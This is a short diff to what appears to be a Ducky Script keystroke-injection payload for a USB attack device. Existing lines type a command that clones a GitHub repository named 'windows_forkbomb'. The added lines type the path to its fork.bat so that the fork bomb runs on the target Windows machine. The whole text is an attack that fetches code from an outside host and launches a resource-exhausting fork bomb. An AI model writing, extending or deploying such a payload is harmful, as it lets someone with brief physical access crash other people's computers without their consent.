@@ -19,3 +19,8 @@ DELAY 3000
 REM Clone the repository
 STRING git clone https://github.com/nrobillard/windows_forkbomb.git
 ENTER
+
+REM run the script
+DELAY 1000
+STRING \Users\nickrobillard\windows_forkbomb\fork.bat
+DELAY 1000
